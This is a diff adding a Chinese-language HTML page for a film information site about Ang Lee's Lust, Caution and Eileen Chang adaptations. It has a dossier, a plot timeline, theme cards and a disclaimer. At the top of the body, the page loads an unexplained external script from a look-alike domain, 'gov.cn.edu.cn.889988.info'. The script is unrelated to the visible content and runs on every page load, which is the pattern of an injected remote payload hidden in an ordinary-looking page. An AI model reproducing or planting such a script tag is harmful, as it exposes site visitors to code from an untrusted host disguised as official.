@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>色戒电影网 - 色·戒影评/张爱玲改编/华语情欲伦理电影资料</title>
+<meta name="description" content="色戒电影网整理李安《色·戒》电影档案、张爱玲改编作品、间谍爱情片与华语情欲伦理电影资料，含剧情背景、演员导演、分级争议与同类片导航。">
+<meta name="keywords" content="色戒电影网,色·戒,李安,张爱玲,梁朝伟,汤唯,华语情欲伦理电影,sejiedianyingwang-h5">
+<style>
+:root{
+  --bg:#120d0b;
+  --panel:#1c1512;
+  --line:#3a2a22;
+  --gold:#d8b46a;
+  --red:#b23a48;
+  --ink:#efe2d2;
+  --muted:#a98f7c;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  background:
+    radial-gradient(900px 300px at 85% -5%, rgba(178,58,72,.18), transparent),
+    radial-gradient(700px 260px at 0% 0%, rgba(216,180,106,.12), transparent),
+    var(--bg);
+  color:var(--ink);
+  font-family:"Songti SC","Noto Serif SC","PingFang SC",serif;
+  font-size:16px;line-height:1.8;
+}
+a{color:var(--gold);text-decoration:none}
+
+/* 顶栏 */
+.film-header{
+  position:sticky;top:0;z-index:60;
+  background:rgba(18,13,11,.9);
+  border-bottom:1px solid var(--line);
+  backdrop-filter:blur(8px);
+}
+.film-header__row{
+  max-width:1180px;margin:0 auto;padding:.85rem 1rem;
+  display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:.6rem;
+}
+.brand{font-size:1.3rem;font-weight:900;color:#fff;letter-spacing:2px}
+.brand b{color:var(--gold)}
+.brand small{display:block;font-size:.68rem;color:var(--muted);letter-spacing:1px;font-weight:400}
+.menu{display:flex;gap:.45rem;flex-wrap:wrap}
+.menu a{
+  padding:.4rem .85rem;border-radius:6px;font-size:.86rem;
+  background:var(--panel);border:1px solid var(--line);color:var(--muted);
+}
+.menu a:hover{color:#fff;border-color:var(--red);background:rgba(178,58,72,.12)}
+
+/* Hero */
+.hero{
+  max-width:1180px;margin:0 auto;padding:3.2rem 1rem 2rem;
+  display:grid;grid-template-columns:1.2fr .8fr;gap:2rem;align-items:center;
+}
+.hero h1{font-size:2.3rem;line-height:1.25;margin-bottom:1rem;letter-spacing:1px}
+.hero h1 em{color:var(--red);font-style:normal}
+.hero p{color:var(--muted);margin-bottom:1.5rem}
+.hero .btn{
+  display:inline-block;padding:.7rem 1.7rem;border-radius:8px;font-weight:800;
+  background:linear-gradient(90deg,var(--gold),var(--red));color:#1a0d0a;
+}
+.poster{
+  height:230px;border-radius:18px;
+  background:
+    repeating-linear-gradient(0deg,transparent 0 6px,rgba(0,0,0,.18) 6px 7px),
+    linear-gradient(135deg,#3a2a22,#1c1512);
+  border:1px solid var(--line);
+  display:flex;align-items:center;justify-content:center;font-size:4.5rem;color:var(--gold);
+  box-shadow:inset 0 0 50px rgba(178,58,72,.2);
+}
+
+/* 区块 */
+.section{max-width:1180px;margin:0 auto;padding:2.6rem 1rem}
+.h2{
+  font-size:1.55rem;margin-bottom:1.4rem;color:var(--gold);
+  display:flex;align-items:center;gap:.6rem;letter-spacing:1px;
+}
+.h2::before{content:"❖";color:var(--red)}
+
+/* 色·戒档案：定义列表 */
+.dossier{
+  background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:1.4rem 1.6rem;
+}
+.dossier dl{display:grid;grid-template-columns:120px 1fr;gap:.7rem 1rem}
+.dossier dt{color:var(--gold);font-weight:700}
+.dossier dd{color:var(--ink)}
+
+/* 情欲与权力：时间线 */
+.timeline{border-left:2px solid var(--line);padding-left:1.1rem;display:flex;flex-direction:column;gap:1rem}
+.tl{
+  position:relative;background:var(--panel);border:1px solid var(--line);
+  border-radius:14px;padding:.9rem 1rem;
+}
+.tl::before{
+  content:"";position:absolute;left:-1.5rem;top:1.1rem;width:12px;height:12px;border-radius:50%;
+  background:var(--gold);box-shadow:0 0 8px var(--gold);
+}
+.tl h3{font-size:1rem;margin-bottom:.25rem}
+.tl span{font-size:.82rem;color:var(--muted)}
+
+/* 间谍爱情片：对仗双栏 */
+.duo{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
+.card{
+  background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:1.1rem;
+}
+.card h3{font-size:1.02rem;margin-bottom:.35rem;color:var(--gold)}
+.card p{font-size:.85rem;color:var(--muted)}
+
+/* 张爱玲改编：书页列表 */
+.booklist{display:flex;flex-direction:column;gap:.8rem}
+.book{
+  display:grid;grid-template-columns:54px 1fr;gap:1rem;align-items:center;
+  background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:.85rem 1rem;
+}
+.book__no{
+  width:54px;height:54px;border-radius:10px;display:flex;align-items:center;justify-content:center;
+  font-weight:900;color:#1a0d0a;background:linear-gradient(135deg,var(--gold),#caa15a);
+}
+.book h3{font-size:.98rem}
+.book p{font-size:.82rem;color:var(--muted)}
+
+/* 声明 */
+.note{
+  background:linear-gradient(135deg,#1c1512,#241710);
+  border:1px solid var(--line);border-radius:20px;padding:1.8rem;
+}
+.note h2{color:var(--gold);margin-bottom:.8rem;letter-spacing:1px}
+.note p{color:var(--muted);margin-bottom:.5rem}
+.note code{background:#000;padding:.2rem .5rem;border-radius:8px;color:var(--gold)}
+
+/* 底部 */
+.foot{
+  text-align:center;padding:2rem 1rem;color:var(--muted);font-size:.82rem;
+  border-top:1px solid var(--line);margin-top:2rem;letter-spacing:.5px;
+}
+
+/* 移动端 */
+@media (max-width:768px){
+  .hero{grid-template-columns:1fr;text-align:center}
+  .poster{order:-1;height:180px;font-size:3.4rem}
+  .duo{grid-template-columns:1fr}
+  .dossier dl{grid-template-columns:96px 1fr}
+  .menu{justify-content:center}
+  h1{font-size:1.85rem!important}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="film-header">
+  <div class="film-header__row">
+    <div class="brand">色戒<b>电影网</b><small>sejiedianyingwang-h5.github.io</small></div>
+    <nav class="menu">
+      <a href="#">首页</a>
+      <a href="#dossier">色·戒档案</a>
+      <a href="#power">情欲与权力</a>
+      <a href="#spy">间谍爱情片</a>
+      <a href="#zhang">张爱玲改编</a>
+      <a href="#note">站点声明</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div>
+    <h1>《色·戒》：<br><em>情欲、间谍、人心</em> 的华语样本</h1>
+    <p>色戒电影网以李安 2007 年金狮奖作品《色·戒》为入口，整理华语情欲伦理、间谍爱情与张爱玲改编电影资料，偏影评/资料/导航，不提供违规内容。</p>
+    <a href="#" class="btn">查看影档</a>
+  </div>
+  <div class="poster">🎞️</div>
+</section>
+
+<section class="section" id="dossier">
+  <h2 class="h2">色·戒 电影档案</h2>
+  <div class="dossier">
+    <dl>
+      <dt>片名</dt><dd>《色·戒》 / Lust, Caution</dd>
+      <dt>导演</dt><dd>李安</dd>
+      <dt>主演</dt><dd>梁朝伟、汤唯、王力宏、陈冲</dd>
+      <dt>原著</dt><dd>张爱玲同名短篇小说</dd>
+      <dt>背景</dt><dd>抗战时期香港与上海，卧底色诱与刺杀汉奸</dd>
+      <dt>奖项</dt><dd>威尼斯电影节金狮奖、金马奖最佳剧情片等</dd>
+      <dt>分级</dt><dd>美国 NC-17、香港Ⅲ级、内地公映删减版</dd>
+      <dt>主题</dt><dd>欲望、背叛、民族大义与个人情感的角力</dd>
+    </dl>
+  </div>
+</section>
+
+<section class="section" id="power">
+  <h2 class="h2">情欲与权力</h2>
+  <div class="timeline">
+    <div class="tl"><h3>话剧组爱国</h3><span>香港岭南学生以演出唤醒民族情绪，刺杀计划由此萌芽</span></div>
+    <div class="tl"><h3>麦太太潜入</h3><span>王佳芝以“麦太太”身份进入易家社交圈</span></div>
+    <div class="tl"><h3>情欲反客为主</h3><span>刺杀目标与卧底之间，身体关系逐渐压倒政治任务</span></div>
+    <div class="tl"><h3>一句“快走”</h3><span>情感动摇任务，权力与欲望的边界彻底模糊</span></div>
+    <div class="tl"><h3>结局空床</h3><span>刺杀成功后，留下的是人性残局而非胜利</span></div>
+  </div>
+</section>
+
+<section class="section" id="spy">
+  <h2 class="h2">间谍爱情片导航</h2>
+  <div class="duo">
+    <article class="card"><h3>潜伏与假婚</h3><p>以婚姻/情人为掩护的特工片，重点在“演戏的人先动了情”。</p></article>
+    <article class="card"><h3>旗袍与密码</h3><p>老上海、租界、麻将桌、暗号与旗袍，符号即叙事。</p></article>
+    <article class="card"><h3>双面卧底</h3><p>国共、汪伪、军统多重身份，忠诚对象不断反转。</p></article>
+    <article class="card"><h3>战争中的私情</h3><p>大时代压住小人物，爱情常被民族叙事审判。</p></article>
+  </div>
+</section>
+
+<section class="section" id="zhang">
+  <h2 class="h2">张爱玲改编片单</h2>
+  <div class="booklist">
+    <div class="book"><div class="book__no">壹</div><div><h3>色·戒</h3><p>李安执导，张爱玲短篇中最具争议的一次影视化。</p></div></div>
+    <div class="book"><div class="book__no">贰</div><div><h3>倾城之恋</h3><p>乱世里的算计与妥协，白流苏与范柳原的“城塌成全”。</p></div></div>
+    <div class="book"><div class="book__no">叁</div><div><h3>红玫瑰与白玫瑰</h3><p>“娶了红玫瑰，白的是蚊子血；娶了白玫瑰，红的是朱砂痣”。</p></div></div>
+    <div class="book"><div class="book__no">肆</div><div><h3>半生缘</h3><p>错过与压抑，张爱玲式爱情最绵长的余味。</p></div></div>
+  </div>
+</section>
+
+<section class="section" id="note">
+  <div class="note">
+    <h2>站点声明</h2>
+    <p>色戒电影网仅做电影资料、影评摘要与同类片导航，不提供色情内容、盗版资源或违规下载。</p>
+    <p>网址：<code>https://sejiedianyingwang-h5.github.io</code></p>
+    <p>《色·戒》含成人主题与限制级内容，本站面向成年影迷与研究用途，请遵守当地法律法规。</p>
+    <a href="#" class="btn">收藏本站</a>
+  </div>
+</section>
+
+<footer class="foot">
+  © 2024 色戒电影网 ｜ sejiedianyingwang-h5.github.io ｜ 华语情欲伦理电影资料站 / 移动端自适应
+</footer>
+
+</body>
+</html>
